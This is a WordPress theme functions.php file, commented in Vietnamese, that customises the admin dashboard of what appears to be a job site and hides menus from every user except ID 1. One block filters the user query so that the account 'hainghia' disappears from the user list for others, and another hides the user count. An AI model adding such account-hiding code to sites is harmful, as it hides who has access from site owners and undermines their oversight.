<?php
error_reporting(E_ALL & ~E_NOTICE);
error_reporting(E_PARSE | E_CORE_ERROR | E_CORE_WARNING | E_COMPILE_ERROR | E_ERROR | E_WARNING | E_USER_ERROR | E_USER_WARNING | E_RECOVERABLE_ERROR);

add_action('wp_dashboard_setup', 'kukun_custom_welcome_dashboard');
function kukun_custom_welcome_dashboard()
{
    global $wp_meta_boxes;
    wp_add_dashboard_widget('custom_support_widget', 'Giới thiệu', 'custom_dashboard_support');
}

function custom_dashboard_support()
{ ?>
    <h2>Chào mừng đến với Hệ thống Quản Trị Website</h2>
    <p><strong>THÔNG TIN CƠ QUAN CHỦ QUẢN</strong></p>
    <P><?php echo bloginfo('name'); ?></p>
    <p><strong>NHÀ PHÁT TRIỂN</strong></p>
    <p>Hệ thống được phát triển bởi <a rel="nofollow" href="https://jobkey.vn/"><strong>Jobkey</strong></a></p>
    <?php
}

/********************************************************************
 *================= Hide Admin Bar =============================
 ********************************************************************/
add_filter('show_admin_bar', '__return_false');
add_action('admin_print_scripts-profile.php', 'amm_hat_add_css_style');
function amm_hat_add_css_style(): void
{
    ?>
    <style type="text/css">
        .show-admin-bar {
            display: none !important;
        }
    </style>
    <?php
}

/********************************************************************
 * // Change Admin Footer
 ********************************************************************/
add_filter('admin_footer_text', 'kukun_change_admin_footer_copyright');
function kukun_change_admin_footer_copyright(): void
{
    echo '<a href="/">#Việc Làm Đà Nẵng</a>';
}

/********************************************************************
 *THAY ĐỔI URL TẠI LOGO ĐĂNG NHẬP
 ********************************************************************/
add_filter('login_headerurl', 'custom_loginlogo_url');
function custom_loginlogo_url($url)
{
    return '/';
}

/********************************************************************
 * ẨN THÔNG TIN TÀI KHOẢN HẢI NGHĨA
 ********************************************************************/
add_action('pre_user_query', 'yoursite_pre_user_query');
function yoursite_pre_user_query($user_search)
{
    global $current_user;
    $username = $current_user->user_login;
    if ($username == 'hainghia') {
    } else {
        global $wpdb;
        $user_search->query_where = str_replace('WHERE 1=1',
            "WHERE 1=1 AND {$wpdb->users}.user_login != 'hainghia'", $user_search->query_where);
    }
}

/********************************************************************
 * Ẩn bộ đếm số tài khoản
 ********************************************************************/
add_action('admin_head', 'hide_user_count');
function hide_user_count()
{
    ?>
    <style>
        .wp-admin.users-php span.count {
            display: none;
        }
    </style>
<?php }

/*********************************************************************
 * Chặn thành viên không phải role Admin truy cập Admin WP
 *********************************************************************/
// add_action('after_setup_theme', 'remove_admin_bar');
// function remove_admin_bar() {
// 	if (!current_user_can('administrator') && !is_admin()) {
// 	  show_admin_bar(false);
// 	}
// }
// add_action( 'admin_init',  function () {
// 	if ( ! current_user_can( 'administrator' ) && ('/wp-admin/admin-ajax.php' != $_SERVER['PHP_SELF']) ) {
// 		wp_redirect( home_url() );
// 		exit;
// 	}
// });


/********************************************************************
 * // Remove Admin Dashboard Widgets
 ********************************************************************/
add_action('admin_init', 'kukun_remove_dashboard_widgets');
function kukun_remove_dashboard_widgets()
{
    remove_action('welcome_panel', 'wp_welcome_panel');
    /** Welcome **/
    remove_meta_box('dashboard_site_health', 'dashboard', 'normal');            /* Tình trạng web của bạn */
    remove_meta_box('wpforms_reports_widget_pro', 'dashboard', 'normal');       /* WPForms */
    remove_meta_box('wp_mail_smtp_reports_widget_lite', 'dashboard', 'normal'); /* WP Mail SMTP */
    remove_meta_box('dashboard_quick_press', 'dashboard', 'normal');            /* Bản Nháp */
    remove_meta_box('e-dashboard-overview', 'dashboard', 'normal');             /* Tổng quan Elementor */
    remove_meta_box('dashboard_primary', 'dashboard', 'normal');                /* Tin tức và sự kiện về WordPress */
    remove_meta_box('dashboard_right_now', 'dashboard', 'normal');              /* Tin Nhanh */
    remove_meta_box('dashboard_activity', 'dashboard', 'normal');               /* Hoạt Động */
    remove_meta_box('wpseo-dashboard-overview', 'dashboard', 'normal');         /* Tổng quan Yoast SEO Bài viết */
}


/*********************************************************************
 * =========================  Hide Admin Menu Back End ================
 *********************************************************************/
add_action('admin_init', 'hide_menu_basic');
function hide_menu_basic()
{
    global $current_user;
    $user_id = get_current_user_id();
    /* Ẩn Menu BachEnd ngoại trừ User có ID = 1 */
    if ($user_id != '1') {
        remove_menu_page('index.php'); //Menu Trang Dashboard
        remove_submenu_page('index.php', 'update-core.php'); //SubMenu Trang Update
        remove_menu_page('edit.php?post_type=page');
        /** Trang Tĩnh */
        remove_menu_page('edit-comments.php'); //Menu trang phản hồi
        remove_menu_page('tools.php'); //Menu trang công cụ
        remove_menu_page('options-general.php'); //Menu trang setting
        remove_menu_page('plugins.php'); //Menu Trang Plugins
    }
}

/*********************************************************************
 * ======== Hide Admin Menu Back End For Plugins, Theme ===============
 *********************************************************************/
add_action('admin_menu', 'hide_menu_advanced', 999);
function hide_menu_advanced()
{
    global $current_user;
    $user_id = get_current_user_id();
    /* Ẩn Menu BachEnd ngoại trừ User có ID = 1 */
    if ($user_id != '1') {
        remove_menu_page('wpseo_dashboard'); //SEO
        remove_menu_page('litespeed'); //LiteSpeed Cache
        remove_submenu_page('themes.php', 'themes.php'); //Giao diện
        remove_submenu_page('themes.php', 'customize.php?return=%2Fwp-admin%2Findex.php'); //Tùy biến
        remove_submenu_page('themes.php', 'theme-editor.php'); //Astra
        remove_submenu_page('themes.php', 'astra'); //Sửa giao diện

    }
}